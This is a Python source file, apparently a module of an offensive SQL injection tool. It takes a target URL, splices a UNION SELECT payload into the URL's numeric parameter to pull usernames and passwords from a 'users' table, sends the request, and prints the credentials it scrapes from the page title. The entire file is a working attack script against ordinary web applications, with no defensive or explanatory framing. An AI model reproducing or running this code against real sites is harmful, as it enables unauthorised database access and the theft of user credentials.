#!/usr/bin/python
import src.source.use
import src.banner.color
import src.Logging.print_stdout

class Injection_Username_Password(object):
    def __init__(self, target_url):
        self.target_injection = target_url
        self.start_time = src.source.use.time.time()
        self.sites = self.target_injection.replace("http://", "")
        self.host = src.source.use.re.sub('/.(.+)', "", self.sites, src.source.use.re.M)
        self.payload_injection = "'union select /*!50000Concat*/(username,0x20,password)+from+users--+--+"
        self.exploit = src.source.use.urllib2.quote(self.payload_injection)
        self.param = src.source.use.re.search("\d+", self.sites, src.source.use.re.M)
        self._param = self.param.group()
        self.prepare = self._param + self.exploit
        self.completed = self.target_injection.replace(self._param, self.prepare)

    def main_injection(self):
        try:
            src.Logging.print_stdout.print_process(
                "Connecting host target {target} at {times}".format(
                    target=self.target_injection,
                    times=src.source.use.time.strftime('%H:%M:%S-%p')
                )
            )
            src.Logging.print_stdout.print_process(
                "Payload Injection => {color}{code}{colors}".format(
                        code=src.source.use.base64.b64encode(
                        self.completed
                    ),
                        color=src.banner.color.pycolor_style.Y,
                        colors=src.banner.color.pycolor_style.W
                )
            ); src.source.use.time.sleep(2)
            if self._param in self.target_injection:
                self.opener = src.source.use.urllib2.urlopen(self.completed)
                src.Logging.print_stdout.print_process(
                    "Connected target {url_target}".format(
                        url_target=self.sites
                    )
                )
                self.htmltext = self.opener.read()
                self.expression = "<title>(.*) (.*)</title>"
                self.find = src.source.use.re.search(self.expression, self.htmltext, src.source.use.re.M)
                src.Logging.print_stdout.print_process(
                    "Checking username and password..."
                )
                self.username = self.find.group(1)
                self.password = self.find.group(2)
                self.end_time = src.source.use.time.time()
                src.Logging.print_stdout.print_process(
                    "Username: {username}".format(
                        username=self.username
                    )
                )
                src.Logging.print_stdout.print_process(
                    "Password: {password}".format(
                        password=self.password
                    )
                )
                src.Logging.print_stdout.print_process(
                    "Time elapsed at {seconds} seconds".format(
                        seconds=round(self.end_time - self.start_time)
                    )
                )
        except KeyboardInterrupt:
            src.Logging.print_stdout.print_error(
                "Detected (Ctrl+C) Interrupt user, Exiting..."
            )
        except src.source.use.urllib2.URLError as error_attack:
            src.Logging.print_stdout.print_error(str(error_attack))
